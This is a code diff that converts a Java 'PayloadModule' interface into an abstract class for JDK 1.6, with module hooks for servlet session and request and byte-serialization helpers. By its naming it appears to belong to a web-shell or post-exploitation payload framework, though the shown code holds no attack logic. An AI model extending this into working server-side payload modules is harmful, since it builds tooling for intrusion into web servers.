@@ -6,41 +6,44 @@ import java.util.Map;
  * Payload Module Interface
  * All function modules need to implement this interface
  */
-public interface PayloadModule {
-    
+// JDK 1.6: interfaces cannot carry method bodies (no `default` methods before
+// Java 8), so this is an abstract class instead. Nothing in the payload
+// implements it, so the change is source-compatible in practice.
+public abstract class PayloadModule {
+
     /**
      * Set session information
      */
-    void setSession(Map session);
-    
+    public abstract void setSession(Map session);
+
     /**
      * Set Servlet request object
      */
-    void setServletRequest(Object servletRequest);
-    
+    public abstract void setServletRequest(Object servletRequest);
+
     /**
      * Execute module function
      * @return execution result byte array (serialized format)
      */
-    byte[] execute();
-    
+    public abstract byte[] execute();
+
     /**
      * Get module name
      */
-    String getModuleName();
-    
+    public abstract String getModuleName();
+
     /**
      * Serialize result to payload.java format
      */
-    default byte[] serializeResult(Map<String, Object> result) {
+    public byte[] serializeResult(Map<String, Object> result) {
         return serializeMap(result);
     }
-    
+
     /**
      * Serialize error message
      */
-    default byte[] serializeError(String errorMessage) {
-        Map<String, Object> errorResult = new java.util.HashMap<>();
+    public byte[] serializeError(String errorMessage) {
+        Map<String, Object> errorResult = new java.util.HashMap<String, Object>();
         errorResult.put("status", "error");
         errorResult.put("message", errorMessage);
         return serializeResult(errorResult);
@@ -49,8 +52,8 @@ public interface PayloadModule {
     /**
      * Serialize success result
      */
-    default byte[] serializeSuccess(Object data) {
-        Map<String, Object> successResult = new java.util.HashMap<>();
+    public byte[] serializeSuccess(Object data) {
+        Map<String, Object> successResult = new java.util.HashMap<String, Object>();
         successResult.put("status", "success");
         successResult.put("data", data);
         return serializeResult(successResult);
@@ -59,7 +62,7 @@ public interface PayloadModule {
     /**
      * Core serialization method (same as payload.java)
      */
-    default byte[] serializeMap(Map<String, Object> map) {
+    public byte[] serializeMap(Map<String, Object> map) {
         java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();
         
         for (Map.Entry<String, Object> entry : map.entrySet()) {
@@ -103,7 +106,7 @@ public interface PayloadModule {
     /**
      * Convert int to 4-byte array
      */
-    default byte[] intToBytes(int value) {
+    public byte[] intToBytes(int value) {
         return new byte[] {
             (byte)(value & 0xFF),
             (byte)((value >> 8) & 0xFF),
